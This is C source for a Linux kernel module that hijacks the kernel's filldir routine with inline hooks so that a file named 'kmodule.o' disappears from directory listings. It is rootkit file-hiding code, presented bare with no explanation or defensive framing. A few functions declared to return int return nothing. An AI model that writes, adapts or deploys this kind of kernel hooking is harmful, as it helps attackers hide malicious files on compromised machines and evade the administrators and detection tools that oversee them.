#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>
#include "hook.c"

#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize;
#else
#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef unsigned long psize;
#endif

psize *filldir;
unsigned char* fill_dir_o_code;



static int my_filldir(void *__buff, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type){
	int result;

	filldir_t filldir_func = (filldir_t) filldir;
	hijack_stop(filldir, fill_dir_o_code);	


	if (strcmp(name, "kmodule.o") == 0) {
		hijack_start(filldir, my_filldir, &fill_dir_o_code);
		return 0;
	}

	result = filldir_func(__buff, name, namelen, offset, ino, d_type);
	
	hijack_start(filldir, my_filldir, &fill_dir_o_code);
	return result;
}


int hide_directory(void) 
{
	(psize *) filldir;

	filldir = (void *)kallsyms_lookup_name("filldir");

	hijack_start(filldir, my_filldir, &fill_dir_o_code);
}


int remove_hook(void){
	hijack_stop(filldir, fill_dir_o_code);
}